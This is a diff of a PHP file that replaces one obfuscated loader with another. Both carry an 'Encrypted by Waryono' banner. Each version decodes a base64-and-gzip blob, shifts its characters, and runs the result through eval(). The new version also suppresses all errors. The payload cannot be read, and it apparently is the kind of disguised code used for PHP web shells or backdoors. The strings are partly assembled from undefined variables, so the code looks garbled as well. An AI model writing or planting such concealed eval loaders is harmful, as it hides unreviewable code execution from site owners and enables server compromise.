@@ -1,9 +1,13 @@
 <?php
 
-/* Encrypted by Waryono Ok */
+/***
 
-function 耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃P($subrekふ灖剃){
-	$Z9i1b㼼桰 = "潩"."⁮"."䅃"."P"."A"."Q";
-	$VESPA¦³ιIηG―�b·B―Bιηk³ζ―G = $ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[011010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101001010].$ιBkIkGθηnJ³»�―·GHεIIB�[010101].$ιBkIkGθηnJ³»�―·GHεIIB�[0101011].$ιBkIkGθηnJ³»�―·GHεIIB�[0101010].$ιBkIkGθηnJ³»�―·GHεIIB�[0101110].$ιBkIkGθηnJ³»�―·GHεIIB�[01101010].$ιBkIkGθηnJ³»�―·GHεIIB�[01010110];$FA_9A = "⁮⁮⁮⁮⁮⁮⁮⁮⁮桰昊⁮⁮⁮⁮⁮⁮⁮⁮";$ZxvIq呐㼼 = "耏"."㼼"."桰"."湵"."㼼"."桰"."! ANDA MAU NGAPAIN !";$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃P("xZJ"."dSg"."MxE"."McPsKeY"."LvuQg"."LotFYU"."WBZ/EB/"."ugDz64E"."Gbb2E"."13NylJ"."VlnKgoewx"."/DjTL2I"."k62K"."N2gYMs"."n8/kmG"."zADQiC"."JprbHCyr"."WxXuklG/JpFCU5"."ag0XECebstEU"."7qLd9n339"."npI234km1"."zZposo8RSE"."4GHOgA"."EIyJggx/twCpxB1kOSMmB"."C0IZGB"."pw4LYn"."vw2EPbA"."/DtZm"."g85lI"."yVh4AK"."B3P2H"."OekL2"."/1++Dv"."0vn1Sw33wuk00tLRYdPFzd"."zW5m1"."zAYE"."FUr0wGUW"."JkSll"."hCrtA"."hVPI"."Fqej"."gCi"."p+pXR"."59Ce"."do1W"."wUN"."Caxj"."e"."5BN94"."Y3WLQJ3"."R4v6"."SxmEBNe"."oVwoR"."HURwax0"."ntjA2"."tkw3"."H4".$S[10]."8fRdD"."ysCVB"."DO".$S[00]."Xl2KqSe"."m4VciFFQ"."0LMV".$S[91]."+tyaI"."PglIY"."0AC"."+/X"."bpK".$A[95]."mVmLlCn".$A[77]."9Sm1yl".$A[211]."6hzv".$A[88]."b0ntWudl".$A[22]."zWJb".$A[44]."w7F9".$A[79]."omT".$A[66]."Xf".$A[44]."l".$A[98]."6ge".$A[9]."B7".$A[2]."FfP".$A[102]."oN"));
+   Encrypted by : Waryono
+   Subcribe Channel => Waryono Ok
+   => Arigatōgozaimashita
 
+***/
+error_reporting(0);
+function 耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃😓($subrekふ灖剃){
+	$他の人の仕事を台無しにしないでください_どうもありがとうございました_私のチャンネルを購読することを忘れないでください;$それらの努力は結果を裏切ることはありません⁮⁮⁮⁮⁮⁮⁮⁮⁮桰昊⁮⁮⁮⁮⁮⁮⁮⁮彼らの仕事を誰かに感謝します;$ZxvIq呐㼼 = "耏"."㼼"."桰"."湵"."㼼"."桰"."Dōshite?";$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(耏㼼桰ੰ昊湵瑣潩⁮䅃呐䡃😓("x"."Z"."J"."d"."T"."s"."M".$他の人の仕事を台無しにしないでください_どうもありがとうござい."wDIAP0FN4Ux9SCWjHAE2bQEI8TPCwB3jggUqR24W1a5tMScpUTZU4BByDnzPtIjgdQ9xgkRUn"."/"."mzHig1Ay"."/"."OE1kpzLVZK21wuWBRMPM9PUEq4hL6"."/"."KWpJ5tbbvn9s314PKe+f"."/"."ibJdd16VHgInAduj4EBcIgZJxV05hACBnEHyZUB45wutGIIiNOR+M".$他の人の仕事を台無しにしないでください_どうもありがとうござい."7s7sB20KWNOcXHPCRh7gGATv2aA9YRkv"."/"."/"."8n3of"."/"."mihu3rufI3ldCYtfB4fT+7nU2h1yOaL1ULUGCpClhgAUmOBqEUa6Smg8mo+WUui6M"."/"."1xR1DvMcGlXbOhFga6u0bBBoMhrcJakNZlChXCKMA8"."/"."ru8ExQhql3ejE0XD4NJgMo4oADZQRF2dcyFTNxZwPnMc".$他の人の仕事を台無しにしないでください_どうもありがとうござい."Ui4e6wKkosXE+e+gqcTyzdmXGYWhEhetan6SqCkenN+frUdTcUYBpjBUV6+sKjvUzl".$人の仕事を台無しにしないでください_どうもありがとうございました_私のチャンネルを購読することを忘れないでくださいそれらの努力は結果を裏切ることはありません⁮⁮⁮⁮⁮⁮⁮⁮⁮桰昊⁮⁮⁮⁮⁮⁮⁮⁮彼らの仕."byyaYb8ZdAPJj8="));
 ?>
